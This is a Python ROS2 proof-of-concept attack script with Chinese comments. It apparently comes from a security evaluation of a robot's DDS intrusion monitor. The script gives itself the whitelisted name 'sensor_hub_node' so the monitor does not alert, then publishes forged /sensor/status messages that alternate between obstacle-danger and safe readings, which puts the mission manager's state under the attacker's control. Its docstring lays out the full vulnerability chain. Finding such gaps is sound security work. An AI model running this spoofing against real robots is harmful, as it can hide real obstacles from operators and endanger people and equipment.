#!/usr/bin/env python3
"""攻擊 N6 — Whitelisted-name namesake + /sensor/status spoof.

漏洞鏈：
    1. monitor whitelist 含 'sensor_hub_node' （[config.yaml:53](../src/dds_security_monitor/config/config.yaml#L53)）
       → 攻擊者命名為 sensor_hub_node 不會觸發 alert
    2. mission_manager._on_sensor 沒驗 publisher 身份、沒 HMAC
       → 任何 publisher 寫 '⚠️ 危險' / '✅ 安全' 都被當作合法 sensor reading
    3. D4 publisher count 只看 /cmd_vel 跟 /scan，不看 /sensor/status
       → 多 publisher 不會被 IDS 偵測

攻擊：
    blinding 模式 — 在真實 sensor_hub 報「⚠️ 危險」時用更高頻率覆蓋成「✅ 安全」
    可導致操作員誤以為 robot 周邊無威脅，但機器其實正接近障礙物。

本 PoC 為了乾淨示範採「直接偽造模式」— 不需要真 sensor_hub 同時跑：
    - 開始 publish '⚠️ 危險' → mission_manager 切換 AVOID_OBSTACLE
    - 切換 publish '✅ 安全' → mission_manager 切換 PATROL
    - 交替證明 mission state 完全在攻擊者掌控之下

威脅模型 4.2 沒列這個攻擊。
"""
import sys
import time
import rclpy
from rclpy.node import Node
from std_msgs.msg import String


# 白名單上的合法名字 → monitor 不會 alert
WHITELISTED_NAME = 'sensor_hub_node'


class SensorStatusSpoofer(Node):

    def __init__(self):
        super().__init__(WHITELISTED_NAME)   # ★ 命名為白名單上的節點
        self._pub = self.create_publisher(String, '/sensor/status', 10)
        self._tick_count = 0
        self.create_timer(1.0, self._publish_spoofed)
        self.get_logger().error(
            f'🕵️ 偽裝為「{WHITELISTED_NAME}」（白名單，monitor 不會 alert）\n'
            f'   發布偽造 /sensor/status，每 5 秒切換危險/安全'
        )

    def _publish_spoofed(self):
        self._tick_count += 1
        # 5 秒週期：3 秒「危險」+ 2 秒「安全」，看 mission_manager 的反應
        phase = self._tick_count % 5
        if phase < 3:
            text = '[感測器狀態] 最近障礙物: 0.12m | ⚠️ 危險 | 水平加速度: 0.50m/s²'
            label = '危險'
        else:
            text = '[感測器狀態] 最近障礙物: 2.50m | ✅ 安全 | 水平加速度: 0.10m/s²'
            label = '安全'
        m = String()
        m.data = text
        self._pub.publish(m)
        self.get_logger().warn(
            f'  [t={self._tick_count}s] 偽造 sensor: {label}'
        )


def main():
    rclpy.init()
    node = SensorStatusSpoofer()
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 25.0
    deadline = time.monotonic() + duration
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.5)
    finally:
        node.get_logger().error('⏹ 結束（mission_manager 視為合法 sensor_hub）')
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
